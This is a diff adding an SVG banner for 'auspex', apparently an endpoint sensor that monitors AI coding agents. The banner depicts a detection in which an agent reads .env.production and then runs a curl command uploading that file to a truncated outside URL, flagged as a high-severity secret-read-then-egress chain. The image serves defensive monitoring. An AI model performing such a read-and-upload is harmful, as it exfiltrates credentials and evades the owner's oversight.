@@ -1,0 +1,52 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="460" viewBox="0 0 1200 460"
+     role="img" aria-labelledby="heroTitle heroDesc">
+  <title id="heroTitle">auspex: endpoint sensor for AI coding agent activity</title>
+  <desc id="heroDesc">Watch what AI coding agents actually do on a machine, and stop what shouldn't run. Below the title, a real scan result: two normalized events, a read of .env.production and a curl upload of that file, correlated into one high-severity chain finding, secret-file access followed by data-bearing egress.</desc>
+
+  <defs>
+    <style>
+      .mono { font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace; }
+      .sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; }
+    </style>
+  </defs>
+
+  <rect width="1200" height="460" rx="20" fill="#0B0D0F"/>
+  <rect x="0.75" y="0.75" width="1198.5" height="458.5" rx="19.25" fill="none" stroke="#1D242B"/>
+
+  <g id="identity">
+    <text class="mono" x="60" y="62" font-size="18" letter-spacing="3.2" fill="#79848F">ENDPOINT SENSOR · AI CODING AGENT ACTIVITY</text>
+
+    <text class="mono" x="58" y="152" font-size="96" font-weight="500" fill="#E9EDF1">auspex</text>
+    <rect x="410" y="98" width="24" height="56" fill="#E3A84C"/>
+
+    <text class="sans" x="60" y="212" font-size="31" fill="#E9EDF1">Watch what AI coding agents actually do on a machine.</text>
+    <text class="sans" x="60" y="252" font-size="31" fill="#E9EDF1">Stop the actions that shouldn&#39;t run.</text>
+  </g>
+
+  <g id="metadata" text-anchor="end">
+    <text class="mono" x="1140" y="128" font-size="19" fill="#79848F">27 agents · 51 CEL rules · 3 capture surfaces</text>
+    <text class="mono" x="1140" y="158" font-size="19" fill="#5E6872">runs local · schema v0.2.0 · Apache-2.0</text>
+  </g>
+
+  <line x1="60" y1="296" x2="1140" y2="296" stroke="#222A31"/>
+
+  <g id="specimen">
+    <text class="mono" x="60" y="332" font-size="17" letter-spacing="2.4" fill="#5E6872">ONE AGENT TRANSCRIPT, SCANNED COLD · NO PRIOR INSTRUMENTATION</text>
+
+    <path d="M76 361 V412" stroke="#E3A84C" stroke-opacity="0.5" stroke-width="1.5"/>
+
+    <circle cx="76" cy="361" r="4.5" fill="#79848F"/>
+    <text class="mono" x="100" y="368" font-size="20" fill="#79848F">file.read</text>
+    <text class="mono" x="300" y="368" font-size="20" fill="#C7CFD7">/workspace/acme-api/.env.production</text>
+
+    <circle cx="76" cy="393" r="4.5" fill="#79848F"/>
+    <text class="mono" x="100" y="400" font-size="20" fill="#79848F">command.exec</text>
+    <text class="mono" x="300" y="400" font-size="20" fill="#C7CFD7">curl --data-binary @.env.production https://…</text>
+
+    <rect x="60" y="412" width="1080" height="40" rx="8" fill="#1A1509" stroke="#E3A84C" stroke-opacity="0.4"/>
+    <rect x="60" y="412" width="3" height="40" rx="1.5" fill="#E3A84C"/>
+    <text class="mono" x="96" y="438" font-size="20" fill="#E3A84C">chain.secret_read_then_egress</text>
+    <text class="mono" x="452" y="438" font-size="20" fill="#E9EDF1">Secret-file access followed by data-bearing egress</text>
+    <text class="mono" x="1120" y="438" font-size="18" letter-spacing="1.2" fill="#E3A84C" text-anchor="end">HIGH</text>
+  </g>
+</svg>
